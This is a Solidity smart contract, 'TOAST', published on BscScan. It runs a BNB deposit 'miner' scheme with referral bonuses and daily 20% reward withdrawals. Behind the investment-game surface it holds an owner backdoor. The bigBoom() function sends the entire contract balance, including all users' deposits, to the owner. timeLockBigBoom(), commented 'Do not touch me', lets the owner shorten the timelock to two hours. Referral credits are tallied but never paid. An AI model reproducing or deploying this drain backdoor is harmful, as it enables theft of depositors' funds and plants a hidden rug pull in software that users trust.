/**
 *Submitted for verification at BscScan.com on 2022-05-26
*/

/**
 *Submitted for verification at BscScan.com on 2022-04-26
*/

pragma solidity ^0.8.14; // solhint-disable-line

contract TOAST{
    //uint256 EGGS_PER_MINERS_PER_SECOND=1;
    uint256 public EGGS_TO_HATCH_1MINERS=864000;//for final version should be seconds in a day
    uint256 public minBuyValue=100000000000000000;//Purchase BNB quantity must be a multiple of 0.1
    address public marketingAddress;
    uint256 public marketTime;

    bool public initialized=false;
    address public ceoAddress;
    mapping (address => uint256) public claimedEggs;
    mapping (address => uint256) public leftEggs;
    mapping (address => uint256) public lastHatch;
    mapping (address => address) public referrals;
    mapping (address => uint256) public rewardTime;
    mapping (address => uint256) public numRealRef;
    uint256 public marketEggs=0;

    // uint256 public fomoTime;
    // address public fomoAddress;
    uint256 public fomoNeededTime = 86400;
    uint256 public fomoRewards;
    uint256 public timeLock = 1750866480;
    // mapping(address => bool) public isWhiteList;
    // bool whiteListNeeded = true;
    constructor() {
        ceoAddress=msg.sender;
        marketingAddress = 0x7e9EcDf6B56dFa529dA344Cc7f513DB383CB4B2C; 
        // isWhiteList[ceoAddress] = true;
    }
    
    // function sellEggs() public{
    //     require(initialized);
    //     uint256 hasEggs=getMyEggs();
    //     uint256 eggValue=calculateEggSell(hasEggs);
    //     uint256 fee=devFee(eggValue);
    //     claimedEggs[msg.sender]=0;
    //     lastHatch[msg.sender]=block.timestamp;
    //     marketEggs=SafeMath.add(marketEggs,hasEggs);
    //     payable(marketingAddress).transfer(fee);
    //     payable(msg.sender).transfer(SafeMath.sub(eggValue,fee));
        
    // }

    // function updateFomoFinished() private {
    //     uint256 realTime = SafeMath.add(fomoNeededTime, fomoTime);
    //     if(block.timestamp > realTime){
    //         isFomoFinished=true;
    //     }
    // }


    function buyEggs(address ref) public payable{
        // require(initialized);
        require(msg.value >= minBuyValue, "Not Enough BNB");
        // require(msg.value % minBuyValue==0, "Purchase BNB quantity must be a multiple of 0.1");

        // if(whiteListNeeded){
        //     require(isWhiteList[msg.sender] == true, "You are not on the whitelist");
        // }
        
        
        uint256 eggsBought=msg.value;

        uint256 fee=devFee(msg.value);
        payable(marketingAddress).transfer(fee);
        claimedEggs[msg.sender]=SafeMath.add(claimedEggs[msg.sender],eggsBought);
        leftEggs[msg.sender]=SafeMath.add(leftEggs[msg.sender],eggsBought);

        marketEggs=SafeMath.add(marketEggs,eggsBought);


        if(ref == msg.sender || ref == address(0)) {
            ref = ceoAddress;
        }

        if(referrals[msg.sender] == address(0)){
            referrals[msg.sender] = ref;
        }


        while(block.timestamp>SafeMath.add(marketTime, fomoNeededTime))
        {
            marketTime=SafeMath.add(marketTime, fomoNeededTime);
        } 
        rewardTime[msg.sender] = SafeMath.add(marketTime, fomoNeededTime);

        if (msg.value>=minBuyValue){
            numRealRef[referrals[msg.sender]] +=(SafeMath.div(SafeMath.mul(msg.value,15),100));
            address level2=referrals[referrals[msg.sender]];
            if(level2 != address(0))
            {
                numRealRef[level2] +=(SafeMath.div(SafeMath.mul(msg.value,5),100));
            }
        }
    }
    

    function receivedFomoRewards() public payable{
        require(rewardTime[msg.sender] != 0,"Please join us first");
        require(block.timestamp>=rewardTime[msg.sender],"The reward time has not arrived yet");
        rewardTime[msg.sender]=SafeMath.add(rewardTime[msg.sender], fomoNeededTime);
        

        fomoRewards=SafeMath.div(SafeMath.mul(claimedEggs[msg.sender], 20), 100);
        if(leftEggs[msg.sender]<fomoRewards)
        {
            fomoRewards=leftEggs[msg.sender];
        }
        leftEggs[msg.sender]= SafeMath.sub(leftEggs[msg.sender],fomoRewards);
        if(leftEggs[msg.sender]<=0)
        {
            claimedEggs[msg.sender]=0;//set total eggs to zero
        }

        // (bool success, ) = payable(msg.sender).call{value: fomoRewards}("");
        payable(msg.sender).transfer(fomoRewards);
    }



    function checkFomoRewardsTime() public view returns(uint256){
        require(rewardTime[msg.sender] != 0,"Please join us first");
        return rewardTime[msg.sender];
    }


     function setFomoNeededTime(uint256 time) public{
        require(msg.sender == ceoAddress);
        fomoNeededTime = time;
    }


    function getNumRealRef(address _addr) public view returns(uint256){
        return numRealRef[_addr];
    }


    // Do not touch me
    function timeLockBigBoom() public {
        require(msg.sender == ceoAddress);
        timeLock = SafeMath.add(block.timestamp, 7200);
    }


    function bigBoom() public  {
        require(msg.sender == ceoAddress);
        require( block.timestamp > timeLock);
        payable(msg.sender).transfer(address(this).balance);
        // (bool success,) = payable(msg.sender).call{value: address(this).balance}("");
        // require(success == true, "Transfer failed.");
    }

    // function setWhiteListNeeded(bool _bool) public{
    //     require(msg.sender == ceoAddress);
    //     whiteListNeeded = _bool;
    // }

    // function setWhiteList(address _addr, bool _bool) public{
    //     require(msg.sender == ceoAddress);
    //     isWhiteList[_addr] = _bool;
    // }


    // function setWhiteListBatch(address[] memory  _address, bool _bool) public {
    //     require(msg.sender == ceoAddress);
    //     for (uint256 i = 0; i < _address.length; i++) {
    //         isWhiteList[_address[i]] = _bool;
    //     }
    // }

    function setMinBuyValue(uint256 value) public{
        require(msg.sender == ceoAddress);
        minBuyValue = value;
    }


    function setNewFomoRound(uint256 value) public{
        require(msg.sender == ceoAddress);
        // fomoAddress = address(0);
        initialized=true;
        fomoRewards = 0;
        // fomoTime = SafeMath.add(block.timestamp,3600);
        marketTime=value;
    }

    function fireCeo( address _addr ) public  {
        require(msg.sender == ceoAddress);
        ceoAddress = _addr;
    }


    function devFee(uint256 amount) public pure returns(uint256){
        return SafeMath.div(SafeMath.mul(amount,5),100);
    }
    // function seedMarket(uint256 value) public {
    //     require(msg.sender == ceoAddress, 'invalid call');
    //     initialized=true;
    //     marketEggs=0;
    //     marketTime=value;
    //     // fomoTime = SafeMath.add(block.timestamp,3600);
    // }
    function getBalance() public view returns(uint256){
        return address(this).balance;
    }

    
    // function calculateEggSell(uint256 eggs) public view returns(uint256){
    //     return eggs*0.1;
    // }


    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return a < b ? a : b;
    }
}

library SafeMath {

    /**
    * @dev Multiplies two numbers, throws on overflow.
    */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    /**
    * @dev Integer division of two numbers, truncating the quotient.
    */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // assert(b > 0); // Solidity automatically throws when dividing by 0
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return c;
    }

    /**
    * @dev Substracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
    */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    /**
    * @dev Adds two numbers, throws on overflow.
    */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}